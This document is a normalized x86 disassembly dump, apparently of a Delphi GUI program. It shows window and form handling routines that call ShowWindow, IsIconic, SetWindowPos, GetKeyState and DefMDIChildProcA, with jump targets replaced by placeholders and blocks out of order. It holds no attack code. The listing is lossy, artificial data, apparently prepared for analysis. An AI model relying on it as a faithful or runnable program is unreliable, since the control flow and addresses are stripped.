pop ebp
retn
sub_420494
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
cmp [ ebp - 0x5 ] 0x1
je r-xdata
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x213 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_420500
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd0 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_448ce8
test al al
jne r-xdata
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_420538
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41fac4
mov eax [ ebp - 0xc ]
movzx ecx [ eax + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax 0xb017
call sub_428ec0
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
sub_4205b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_433378
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_42413c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf120
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x213 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
sub_420678
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsZoomed
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x3
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x214 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_420734
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_434714
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x8 ]
sete [ ebp - 0x9 ]
mov dl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_41fa38
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
test [ eax + 0x44 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov dl 0x1
mov bx 0xffd6
call sub_44c24c
sub_4207a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_434e74
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call SetFocus
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_4207ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41fac4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop ecx
pop ecx
pop ebp
retn
sub_420814
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
call sub_40adec
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_40adec
mov [ ebp - 0x8 ] eax
sub_420868
push ebp
mov ebp esp
add esp 0xffffffd8
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x230 ]
call sub_420814
pop ecx
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc ]
call sub_428e90
mov [ ebp - 0xc ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_43b77c
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_42c3a8
lea eax [ ebp - 0x20 ]
call sub_444558
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x6c ]
call sub_420814
pop ecx
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_425610
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_425638
mov ecx [ ebp - 0x10 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_425638
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x150 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x150 ]
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_43b77c
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
call sub_42c3a8
lea eax [ ebp - 0x20 ]
call sub_444558
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x210 ] 0x8
je r-xdata
sub_420998
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x212 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
add eax 0x18
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x14 ]
mov [ eax ] edx
mov eax [ ebp - 0xc ]
add eax 0x20
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x10 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0xc ]
add eax 0x20
push eax
mov eax [ ebp - 0xc ]
add eax 0x24
push eax
mov eax [ ebp - 0xc ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x8 ]
mov [ eax + 0x4 ] edx
sub_420a6c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x20 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x212 ] al
xor eax eax
push ebp
push sub_420b00
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4321cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b07
mov eax [ ebp - 0x4 ]
mov [ eax + 0x212 ] 0x0
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x38 ]
jne r-xdata
mov al 0x1
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
sub_420b12
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2cc ] 0x20
mov eax [ ebp - 0x4 ]
mov bx 0xffb6
call sub_44c24c
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420b48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2cc ] 0xdf
mov eax [ ebp - 0x4 ]
mov bx 0xffb4
call sub_44c24c
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420b7c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4337e4
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_434e74
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x27
je r-xdata
mov cl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x208 ]
call sub_434e74
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
sub_420c48
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42120b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_425ae0
mov eax [ ebp - 0x4 ]
or [ eax + 0x2cc ] 0x4
xor eax eax
push ebp
push sub_4211ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4211f5
mov eax [ ebp - 0x4 ]
and [ eax + 0x2cc ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
xor eax eax
push ebp
push sub_4210ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov bx 0xffb2
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_420d03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov bx 0xffb1
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x60 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41fb30
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430f60
jmp r-xdata
mov eax [ rw-data ]
call sub_4226cc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_42c25c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x218 ]
add al 0xfa
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_434714
mov ebx eax
call GetActiveWindow
cmp ebx eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4226ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_42c2b0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x5
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x7
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
call sub_41a234
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x213 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x213 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_42274c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_42c25c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4226cc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x213 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x3c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_42cdec
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x23c ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_42272c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_42c2b0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4226ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx [ ebp - 0x14 ]
add eax [ edx + 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
call sub_41eb2c
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x23c ]
push eax
call SendMessageA
jmp r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp - 0x14 ]
add eax [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
cmp [ ebp - 0xc ] 0x0
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_41eb2c
jmp r-xdata
sub_420d08
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4251dc
call sub_44c818
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_4226cc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_42c25c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x218 ]
add al 0xfa
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4226ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_42c2b0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x5
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x7
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x213 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x213 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_42274c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_42c25c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4226cc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x38 ]
